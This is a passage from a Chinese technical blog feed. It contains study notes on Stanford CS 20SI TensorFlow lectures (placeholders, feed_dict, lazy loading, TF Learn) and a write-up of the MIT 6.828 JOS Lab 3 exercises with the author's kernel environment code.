<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tf.placeholder(dtype, shape=None, name=None)</div></pre></td></tr></table></figure>
<p>Dtype 是必须的参数指明了占位符的数据类型。</p>
<p>Shape 规定了占位符能接受的张量的维度。shape=None 表示任何维度都可以接受。坏处就是不好debug。</p>
<p>只定义了占位符还没用，需要通过获取值来进行计算。placeholder 获取的值通过一个字典。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># create a placeholder of type float 32-bit, shape is a vector of 3 elements</div><div class="line">a = tf.placeholder(tf.float32, shape=[3])</div><div class="line"># create a constant of type float 32-bit, shape is a vector of 3 elements</div><div class="line">b = tf.constant([5, 5, 5], tf.float32)</div><div class="line"># use the placeholder as you would a constant or a variable</div><div class="line">c = a + b  # Short for tf.add(a, b)</div><div class="line">with tf.Session() as sess:</div><div class="line">      # feed [1, 2, 3] to placeholder a via the dict &#123;a: [1, 2, 3]&#125;</div><div class="line">      # fetch value of c</div><div class="line">      print sess.run(c, &#123;a: [1, 2, 3]&#125;) # the tensor a is the key, not the string ‘a’</div></pre></td></tr></table></figure>
<p>获取值不仅仅是占位符可以，任何可获取值的张量都可以。使用一下方法可以确定张量是否可获取值:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tf.Graph.is_feedable(tensor)</div></pre></td></tr></table></figure>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># create Operations, Tensors, etc (using the default graph)</div><div class="line">a = tf.add(2, 5)</div><div class="line">b = tf.mul(a, 3)</div><div class="line"># start up a `Session` using the default graph</div><div class="line">sess = tf.Session()</div><div class="line"># define a dictionary that says to replace the value of `a` with 15</div><div class="line">replace_dict = &#123;a: 15&#125;</div><div class="line"># Run the session, passing in `replace_dict` as the value to `feed_dict`</div><div class="line">sess.run(b, feed_dict=replace_dict) # returns 45</div></pre></td></tr></table></figure>
<h4 id="u61D2_u52A0_u8F7D"><a href="#u61D2_u52A0_u8F7D" class="headerlink" title="懒加载"></a>懒加载</h4><p>懒加载是一种编程模式，表示直到加载的时候才声明或者初始化。在 TensorFlow 中，表示直到进行计算的时候才创建这个操作。</p>
<p>比如正常情况下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">x = tf.Variable(10, name=&apos;x&apos;)</div><div class="line">y = tf.Variable(20, name=&apos;y&apos;)</div><div class="line">z = tf.add(x, y)</div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(tf.global_variables_initializer())</div><div class="line">    writer = tf.summary.FileWriter(&apos;./my_graph/l2&apos;, sess.graph)</div><div class="line">    for _ in range(10):</div><div class="line">        sess.run(z)</div><div class="line">        writer.close()</div></pre></td></tr></table></figure>
<p>而懒加载的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">x = tf.Variable(10, name=&apos;x&apos;)</div><div class="line">y = tf.Variable(20, name=&apos;y&apos;)</div><div class="line">with tf.Session() as sess:</div><div class="line">     sess.run(tf.global_variables_initializer())</div><div class="line">     writer = tf.summary.FileWriter(&apos;./my_graph/l2&apos;, sess.graph)</div><div class="line">     for _ in range(10):</div><div class="line">           sess.run(tf.add(x, y)) # someone decides to be clever to save one line of code</div><div class="line">     writer.close()</div></pre></td></tr></table></figure>
<p>通过查看 TensorBoard ，可以发现不同之处。</p>
<p>当然，也可以通过查看 图 定义，使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print tf.get_default_graph().as_graph_def()</div></pre></td></tr></table></figure>
<p>发现后者，也就是懒加载中，节点 里多了9个 Add 操作的拷贝。明明同样的操作，却会造成很大的开销。为了避免这个情况，尽量分开定义操作和执行。另一种就是使用 Python property装饰器。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </p>
]]></content>
    
    <summary type="html">
    
      CS 20SI: Tensorflow的Deep Learning研究笔记(二)
    
    </summary>
    
    
      <category term="deep-learning" scheme="http://xinqiu.me/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>Tensorflow for Deep Learning 1</title>
    <link href="http://xinqiu.me/2017/01/20/cs20si-1/"/>
    <id>http://xinqiu.me/2017/01/20/cs20si-1/</id>
    <published>2017-01-19T16:00:00.000Z</published>
    <updated>2017-02-02T09:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="u7B14_u8BB01_3A__u4ECB_u7ECDTensorFlow"><a href="#u7B14_u8BB01_3A__u4ECB_u7ECDTensorFlow" class="headerlink" title="笔记1: 介绍TensorFlow"></a>笔记1: 介绍TensorFlow</h2><p>“CS 20SI: TensorFlow for Deep Learning Research” (<a href="http://cs20si.stanford.edu" target="_blank" rel="external">http://cs20si.stanford.edu</a>) 这门课是由Chip Huyen(huyenn@stanford.edu)老师上的，我就简单的做做笔记整理&gt; &lt;.</p>
<p>Tensorflow是什么，它很火，哪些公司在用它，它是如何安装的，我这里就不啰嗦了，这些内容网上一大把。</p>
<h3 id="u4E00-_u5F00_u59CB_u5199Tensorflow_u4EE3_u7801"><a href="#u4E00-_u5F00_u59CB_u5199Tensorflow_u4EE3_u7801" class="headerlink" title="一.开始写Tensorflow代码"></a>一.开始写Tensorflow代码</h3><p>这部分内容是可以跳过的，讲的是简单的一个tf程序。(我添加了导入一些包，不然运行不了)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># iris.py</span></div><div class="line"><span class="comment"># </span></div><div class="line"><span class="comment"># Load dataset.</span></div><div class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</div><div class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> cross_validation</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</div><div class="line"></div><div class="line">iris = tf.contrib.learn.datasets.load_dataset(<span class="string">'iris'</span>)</div><div class="line"></div><div class="line">x_train, x_test, y_train, y_test = cross_validation.train_test_split(iris.data, iris.target, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</div><div class="line">						</div><div class="line"><span class="comment"># Build 3 layer DNN with 10, 20, 10 units respectively.</span></div><div class="line">feature_columns = tf.contrib.learn.infer_real_valued_columns_from_input(x_train)</div><div class="line"></div><div class="line">classifier = tf.contrib.learn.DNNClassifier(feature_columns=feature_columns, hidden_units=[<span class="number">10</span>, <span class="number">20</span>, <span class="number">10</span>], n_classes=<span class="number">3</span>)</div><div class="line">					</div><div class="line"><span class="comment"># Fit and predict.</span></div><div class="line">classifier.fit(x_train, y_train, steps=<span class="number">200</span>)</div><div class="line"></div><div class="line">predictions = list(classifier.predict(x_test, as_iterable=<span class="keyword">True</span>))</div><div class="line">score = metrics.accuracy_score(y_test, predictions)</div><div class="line">print(<span class="string">'Accuracy: &#123;0:f&#125;'</span>.format(score))</div></pre></td></tr></table></figure>
<p>运行结果 Accuracy: 0.933333</p>
<h4 id="1-_TF_Learn__28tf-contrib-learn_29"><a href="#1-_TF_Learn__28tf-contrib-learn_29" class="headerlink" title="1. TF Learn (tf.contrib.learn)"></a>1. TF Learn (tf.contrib.learn)</h4><p>TensorFlow的简单接口，TF Learn (tensorflow.contrib.learn)，提供已经实现的模型可供使用者简单的调用。类似scikit learn，通过简单的几行代码就可以开始深度学习。事实上TF Learn期初是Scikit Flow (SKFlow)这个独立的项目。</p>
<p>TF Learn可以导入数据，构造模型，模型拟合，评估准确性。很多模型可以调用，比如线性分类，线性回归，DNN分类器。</p>
<h4 id="2-_TF-Slim__28tf-contrib-slim_29"><a href="#2-_TF-Slim__28tf-contrib-slim_29" class="headerlink" title="2. TF-Slim (tf.contrib.slim)"></a>2. TF-Slim (tf.contrib.slim)</h4><p>TF-Slim可以用来简单构建、训练、评估神经网络。</p>
<h4 id="3-_TensorFlow_u4E4B_u4E0A_u7684_u9AD8_u7EA7APIs"><a href="#3-_TensorFlow_u4E4B_u4E0A_u7684_u9AD8_u7EA7APIs" class="headerlink" title="3. TensorFlow之上的高级APIs"></a>3. TensorFlow之上的高级APIs</h4><p>有很多基于TensorFlow的APIs， 比如Keras (keras@GitHub), TFLearn (tflearn@GitHub), 和 Pretty Tensor (prettytensor@GitHub)。现在据说Keras准备作为官方默认API了，Keras真的超级好用&gt; &lt;.</p>
<p>TFLearn支持ConvNets, LSTM, BiRNN, ResNets, Generative networks以及一些特征BatchNorm, PReLU.</p>
<p>当然啦，TensorFlow的目的不是提供开箱即用的机器学习工具箱，而是希望能够针对不同场景不同需求，更灵活的搭建合适的架构来自己使用。</p>
<h3 id="Data_Flow_Graph__28_u6570_u636E_u6D41_u56FE_29"><a href="#Data_Flow_Graph__28_u6570_u636E_u6D41_u56FE_29" class="headerlink" title="Data Flow Graph (数据流图)"></a>Data Flow Graph (数据流图)</h3><p>TF使用数据流图，所有的计算都在图(graphs)中。session(这个我也不知道中文该怎么称呼，感觉英文就挺好的)用来分配给变量内存。参考这篇文章什么是tensorflow session。总之就是图是用来定义计算的，session是执行图里的计算的。</p>
<p>note 1 结束了，感觉有点少，算是入坑的开头吧&gt; &lt;</p>
]]></content>
    
    <summary type="html">
    
      CS 20SI: Tensorflow的Deep Learning研究笔记(一)
    
    </summary>
    
    
      <category term="deep-learning" scheme="http://xinqiu.me/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>MIT 6.828 Lab 3</title>
    <link href="http://xinqiu.me/2017/01/17/MIT-6.828-3/"/>
    <id>http://xinqiu.me/2017/01/17/MIT-6.828-3/</id>
    <published>2017-01-16T16:00:00.000Z</published>
    <updated>2017-02-13T01:56:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>继续开始Lab3，用户环境。</p>
<a id="more"></a>
<h2 id="u5E8F_u8A00"><a href="#u5E8F_u8A00" class="headerlink" title="序言"></a>序言</h2><p>这个lab要实现基础内核功能来保证被保护的用户模式环境正常运行。要为JOS内核添加数据结构，记录用户环境，创建单用户环境，加载程序镜像并运行。要让JOS内核能够处理系统调用和各种异常。</p>
<p><strong>注意</strong>：这里环境类似进程，用环境是为了与操作系统的进程做点区分，强调这是JOS的环境下。</p>
<h2 id="Part_A_3A__u7528_u6237_u73AF_u5883_u548C_u5F02_u5E38_u5904_u7406"><a href="#Part_A_3A__u7528_u6237_u73AF_u5883_u548C_u5F02_u5E38_u5904_u7406" class="headerlink" title="Part A: 用户环境和异常处理"></a>Part A: 用户环境和异常处理</h2><p><code>inc/env.h</code>包含了用户环境的定义，内核使用 <code>ENV</code> 数据结构记录每个用户环境，这里用户环境有点像上下文，这个lab只要创建一个环境，但要设计JOS内核让其支持多环境。</p>
<p>在<code>kern/env.c</code>中定义了三个全局变量:</p>
<ul>
<li>struct Env *envs = NULL;        // All environments</li>
<li>struct Env *curenv = NULL;        // The current env</li>
<li>static struct Env *env_free_list;    // Free environment list</li>
</ul>
<p>JOS运行以后，envs指针指向一个存放系统中各种环境的<code>Env</code>结构体数组。JOS内核支持最大<code>NENV</code>(2^10,宏定义在<code>inc/env.h</code>中)个同时活动的环境。</p>
<p>JOS内核用<code>env_free_list</code>维护所有不活动的<code>Env</code>结构体，类似空闲链表。内核使用<code>curenv</code>来表示当前运行的环境，内核启动之前这个变量是NULL。</p>
<h3 id="u73AF_u5883_u72B6_u6001"><a href="#u73AF_u5883_u72B6_u6001" class="headerlink" title="环境状态"></a>环境状态</h3><p><code>Env</code>结构体在<code>inc/env.h</code>中定义了:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">struct Env &#123;</div><div class="line">	struct Trapframe env_tf;	// Saved registers</div><div class="line">	struct Env *env_link;		// Next free Env</div><div class="line">	envid_t env_id;			// Unique environment identifier</div><div class="line">	envid_t env_parent_id;		// env_id of this env&apos;s parent</div><div class="line">	enum EnvType env_type;		// Indicates special system environments</div><div class="line">	unsigned env_status;		// Status of the environment</div><div class="line">	uint32_t env_runs;		// Number of times environment has run</div><div class="line"></div><div class="line">	// Address space</div><div class="line">	pde_t *env_pgdir;		// Kernel virtual address of page dir</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><strong>env_tf</strong>: 定义在<code>inc/trap.h</code>中，用来存放环境停止运行时寄存器的值。内核从用户模式切换为内核模式时也会保存寄存器的值，这样之后环境恢复的时候可以读取出来。</p>
<p><strong>env_link</strong>：指向<code>env_free_list</code>中的下一个<code>Env</code>, <code>env_free_list</code>指向空闲env链表的第一个env环境。</p>
<p><strong>env_id</strong>：当前Env环境的唯一id。即使用户环境终止，这个结构体被重新分配在同一块空间，这个id值还是不同的。</p>
<p><strong>env_parent_id</strong>：内核储存env_id环境的父用户环境id。</p>
<p><strong>env_type</strong>：用来区别特定环境。大部分情况是<code>ENV_TYPE_USER</code>。</p>
<p><strong>env_status</strong>：这个变量保存了以下几种值</p>
<ul>
<li>ENV_FREE： 这个Env结构体不活跃，因此在<code>env_free_list</code>中。</li>
<li>ENV_RUNNABLE：这个结构体对应的环境等待被运行。</li>
<li>ENV_RUNNING：这个结构体对应的环境正在运行。</li>
<li>ENV_NOT_RUNNABLE：当前环境是活跃的但没准备运行。比如等待其他环境进行IPC(进程通信)。</li>
<li>ENV_DYING：这是个僵尸环境，下一次陷入内核会被释放。</li>
</ul>
<p>如同Unix进程，JOS环境结合了线程和地址空间。线程通常由被保存的寄存器定义，地址空间由env_pgdir指向的页目录和页表定义。想要运行环境必须给CPU设置合适的寄存器和地址空间。</p>
<h3 id="u5206_u914D_u73AF_u5883_u6570_u7EC4"><a href="#u5206_u914D_u73AF_u5883_u6570_u7EC4" class="headerlink" title="分配环境数组"></a>分配环境数组</h3><p>修改mem_init()去分配一个Env数组envs。</p>
<h4 id="Exercise_1"><a href="#Exercise_1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><p>分配一个envs数组，这个数组包含Env结构体的实例NENV。和pages数组一样，这个envs应该映射到用户只读的UENVS(定义在<code>inc/memlayout.h</code>)，这样用户进程可以读取。通过修改mem_init()，首先是初始化envs指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// Make &apos;envs&apos; point to an array of size &apos;NENV&apos; of &apos;struct Env&apos;.</div><div class="line">// LAB 3: Your code here.</div><div class="line">envs = (struct Env*)boot_alloc(NENV*sizeof(struct Env));</div><div class="line">memset(envs, 0, NENV*sizeof(struct Env));</div></pre></td></tr></table></figure>
<p>接着是准备映射，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">// Map the &apos;envs&apos; array read-only by the user at linear address UENVS</div><div class="line">// (ie. perm = PTE_U | PTE_P).</div><div class="line">// Permissions:</div><div class="line">//    - the new image at UENVS  -- kernel R, user R</div><div class="line">//    - envs itself -- kernel RW, user NONE</div><div class="line">// LAB 3: Your code here.</div><div class="line">boot_map_region(kern_pgdir, UENVS, PTSIZE, PADDR(envs), PTE_U);</div></pre></td></tr></table></figure>
<p>通过<code>make qemu-nox</code>可看到<code>check_kern_pgdir() succeeded!</code>证明有用。</p>
<h3 id="u521B_u5EFA_u548C_u8FD0_u884C_u73AF_u5883"><a href="#u521B_u5EFA_u548C_u8FD0_u884C_u73AF_u5883" class="headerlink" title="创建和运行环境"></a>创建和运行环境</h3><p>完善<code>kern/env.c</code>使之能够运行一个用户环境。因为还没做文件系统，所以设置内核去加载一个静态二进制镜像，JOS将这个作为ELF可执行镜像嵌入内核。</p>
<p>Lab3的GNUmakefile生成若干二进制镜像在<code>obj/user/</code>目录。</p>
<p>在<code>kern/init.c</code>中的i386_init()中，运行这些二进制镜像的代码都在一个环境中。</p>
<h4 id="Exercise_2"><a href="#Exercise_2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><p> 完成 <code>env.c</code>的以下几个函数。</p>
<ul>
<li><p>env_init()：初始化envs数组中的所有Env结构体并添加到env_free_list中，同时调用env_init_percpu，用来配置硬件不同段，特权级0是内核段，特权级3是用户段。</p>
</li>
<li><p>env_setup_vm()：分配一个页目录给新的环境并初始化新环境地址空间的内核部分。</p>
</li>
<li><p>region_alloc()：分配以及映射物理内存到一个环境。</p>
</li>
<li><p>load_icode()：分析ELF二进制镜像，将其加载到新环境的用户地址空间。</p>
</li>
<li><p>env_create()：使用env_alloc创建一个环境，调用load_icode加载ELF。</p>
</li>
<li><p>env_run()： 在用户模式下运行一个环境。</p>
</li>
</ul>
<h5 id="env_init"><a href="#env_init" class="headerlink" title="env_init"></a>env_init</h5><p>初始化envs数组，因为envs中的env_link指向的是下一个env，所以这里有个技巧是从envs的最后一个元素向前遍历。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">env_init</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// Set up envs array</span></div><div class="line">	<span class="comment">// LAB 3: Your code here.</span></div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">	env_free_list = <span class="literal">NULL</span>;</div><div class="line">    <span class="keyword">for</span> (i = NENV - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</div><div class="line">    	envs[i].env_id = <span class="number">0</span>;</div><div class="line">    	envs[i].env_status = ENV_FREE;</div><div class="line">    	envs[i].env_link = env_free_list;</div><div class="line">    	env_free_list = &amp;envs[i];</div><div class="line">    &#125;</div><div class="line">	<span class="comment">// Per-CPU part of the initialization</span></div><div class="line">	env_init_percpu();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="env_setup_vm"><a href="#env_setup_vm" class="headerlink" title="env_setup_vm"></a>env_setup_vm</h5><p>设置e-&gt;env_pgdir并初始化页目录，可以使用kern_pgdir作为模板。填上这个，计数器加一，将p转化为内核虚拟地址，然后以kern_pgdir为模板复制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">p-&gt;pp_ref++;</div><div class="line">e-&gt;env_pgdir = page2kva(p);</div><div class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir, kern_pgdir, PGSIZE);</div></pre></td></tr></table></figure>
<h5 id="region_alloc"><a href="#region_alloc" class="headerlink" title="region_alloc"></a>region_alloc</h5><p>分配len字节的物理内存给env环境，之后映射到环境中的虚拟地址va。要注意的是，va和len都要进行对齐。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">region_alloc</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="keyword">void</span> *va, <span class="keyword">size_t</span> len)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// LAB 3: Your code here.</span></div><div class="line">	<span class="comment">// (But only if you need it for load_icode.)</span></div><div class="line">	<span class="comment">//</span></div><div class="line">	<span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></div><div class="line">	<span class="comment">//   'va' and 'len' values that are not page-aligned.</span></div><div class="line">	<span class="comment">//   You should round va down, and round (va + len) up.</span></div><div class="line">	<span class="comment">//   (Watch out for corner-cases!)</span></div><div class="line">	<span class="keyword">struct</span> PageInfo *p = <span class="literal">NULL</span>;</div><div class="line">	va = ROUNDDOWN(va, PGSIZE);</div><div class="line">	len = ROUNDUP(len, PGSIZE);</div><div class="line">	<span class="keyword">for</span> (; len; len-=PGSIZE, va+=PGSIZE) &#123;</div><div class="line">		<span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</div><div class="line">			panic(<span class="string">"allocation failed."</span>);</div><div class="line"></div><div class="line">		<span class="keyword">pte_t</span> *pte = pgdir_walk(e-&gt;env_pgdir, va, <span class="literal">true</span>);</div><div class="line">		<span class="keyword">if</span> (!pte)</div><div class="line">			panic(<span class="string">"Unable to alloc page."</span>);</div><div class="line"></div><div class="line">		<span class="keyword">int</span> r = page_insert(e-&gt;env_pgdir, p, va, PTE_U | PTE_W);</div><div class="line">		<span class="keyword">if</span> (r != <span class="number">0</span>)</div><div class="line">			panic(<span class="string">"Page mapping failed."</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="load_icode"><a href="#load_icode" class="headerlink" title="load_icode"></a>load_icode</h5><p>加载可读的ELF二进制镜像到用户环境内存，起始虚拟地址在ELF程序头部应该有，同时将这些段清零，和boot loader类似，之后映射给程序初始栈的一个页。只加载ph-&gt;p_type == ELF_PROG_LOAD的段，每个段的虚拟地址应该在ph-&gt;p_va，它的大小应该是ph-&gt;p_memsz。<code>binary + ph-&gt;p_offset</code>之后的ph-&gt;p_filesz字节要拷贝到虚拟地址ph-&gt;p_va，其他剩余内存应该清零。这个挺难的，我参考了这个<a href="http://grid.hust.edu.cn/zyshao/Teaching_Material/OSEngineering/Chapter5.pdf" target="_blank" rel="external">抢占式调度(lab3) 5.3.2.2</a>。这里一定要注意lcr3()这个函数，通过lcr3指令把页目录表的起始地址存入CR3寄存器，这里的拷贝到指定的虚地址处，是指用户空间的虚地址，而不是内核空间的虚地址，所以还需要用lcr3函数加载用户空间的页表目录才能将地址转换为用户空间地址。参考<a href="http://www.cnblogs.com/bdhmwz/p/5071081.html" target="_blank" rel="external">bdhmwz的MIT 6.828 JOS/XV6 lab3–PARTA</a>。因为这个问题折腾了半天括弧哭。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">static void</div><div class="line">load_icode(struct Env *e, uint8_t *binary)</div><div class="line">&#123;</div><div class="line">	// LAB 3: Your code here.</div><div class="line">	struct Proghdr *ph, *eph;</div><div class="line">	struct Elf *elf_head = (struct Elf *)binary;</div><div class="line">	if (elf_head-&gt;e_magic != ELF_MAGIC) </div><div class="line">		panic(&quot;ELF binary image error.&quot;);</div><div class="line"></div><div class="line">	lcr3(PADDR(e-&gt;env_pgdir));</div><div class="line">	ph = (struct Proghdr*)((uint8_t*)(elf_head) + elf_head-&gt;e_phoff);</div><div class="line">	eph = ph + elf_head-&gt;e_phnum;</div><div class="line">	for(; ph &lt; eph; ph++)</div><div class="line">	&#123;</div><div class="line">		if (ph-&gt;p_type == ELF_PROG_LOAD) &#123;</div><div class="line">			region_alloc(e, (void *)ph-&gt;p_va, ph-&gt;p_memsz);</div><div class="line">			memmove((void*)ph-&gt;p_va,binary+ph-&gt;p_offset,ph-&gt;p_filesz);</div><div class="line">			memset((void*)(ph-&gt;p_va + ph-&gt;p_filesz),0,ph-&gt;p_memsz-ph-&gt;p_filesz);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	e-&gt;env_tf.tf_eip = elf_head-&gt;e_entry;</div><div class="line">	lcr3(PADDR(kern_pgdir));</div><div class="line">	// Now map one page for the program&apos;s initial stack</div><div class="line">	// at virtual address USTACKTOP - PGSIZE.</div><div class="line"></div><div class="line">	// LAB 3: Your code here.</div><div class="line">	region_alloc(e, (void *)(USTACKTOP - PGSIZE), PGSIZE);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="env_create"><a href="#env_create" class="headerlink" title="env_create"></a>env_create</h5><p>使用env_alloc创建一个env，调用load_icode来加载elf二进制镜像，设置env_type。这个env的父id应该设为0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">env_create(uint8_t *binary, enum EnvType type)</div><div class="line">&#123;</div><div class="line">	// LAB 3: Your code here.</div><div class="line">	struct Env *e;</div><div class="line">	int r = env_alloc(&amp;e, 0);</div><div class="line">	if (r)</div><div class="line">		panic(&quot;env_alloc failed&quot;);</div><div class="line">	load_icode(e, binary);</div><div class="line">	e-&gt;env_type = type;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="env_run"><a href="#env_run" class="headerlink" title="env_run"></a>env_run</h5><p>切换上下文，首先判断当前环境是否为空，环境状态是不是ENV_RUNNING，之后将curenv指向新的环境，状态设为ENV_RUNNING，更新env_runs计数器，用lcr3切换到它的地址空间，使用env_pop_tf()储存环境计算器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">env_run(struct Env *e)</div><div class="line">&#123;</div><div class="line">	// LAB 3: Your code here.</div><div class="line">	if (curenv != NULL &amp;&amp; curenv-&gt;env_status == ENV_RUNNING)</div><div class="line">		curenv-&gt;env_status = ENV_RUNNABLE;</div><div class="line">	curenv = e;</div><div class="line">	curenv-&gt;env_status = ENV_RUNNING;</div><div class="line">	curenv-&gt;env_runs++;</div><div class="line">	lcr3(PADDR(curenv-&gt;env_pgdir));</div><div class="line">	env_pop_tf(&amp;(curenv-&gt;env_tf));</div><div class="line"></div><div class="line">	panic(&quot;env_run not yet implemented&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这时候<code>make qemu-nox</code>运行时会出现内存相关错误，暂时不需要担心。</p>
<p>来看一下程序启动的调用顺序图</p>
<ul>
<li>start (kern/entry.S)</li>
<li>i386_init (kern/init.c)<ul>
<li>cons_init</li>
<li>mem_init</li>
<li>env_init</li>
<li>trap_init (still incomplete at this point)</li>
<li>env_create</li>
<li>env_run<ul>
<li>env_pop_tf</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>编译完内核并且运行在QEMU中，正常情况应该是系统进入用户空间，执行hello二进制程序直到系统int指令。然而因为JOS还没有设置硬件使用户过渡到内核，所以会出现问题。当CPU发现系统不能处理系统调用中断，会生成一个通用保护异常，进而又产生一个双重错误异常，同样因为解决不了，最终会导致三重错误(triple fault)。通常需要重启使CPU复位，这很麻烦，还好是在QEMU中，就会出现寄存器dump。</p>
<p>使用debugger去检查是否进入用户模式。使用<code>make qemu-gdb</code>然后在env_pop_tf处打断点。使用si单步调试，处理器执行iret指令之后的命令。</p>
<h3 id="u5904_u7406_u4E2D_u65AD_u548C_u5F02_u5E38"><a href="#u5904_u7406_u4E2D_u65AD_u548C_u5F02_u5E38" class="headerlink" title="处理中断和异常"></a>处理中断和异常</h3><p>用户空间的系统调用指令 int $0x30 是终止：处理器进入用户模式但不能返回。所以要实现基础的异常和系统调用处理，这样内核就能从用户模式恢复控制权。</p>
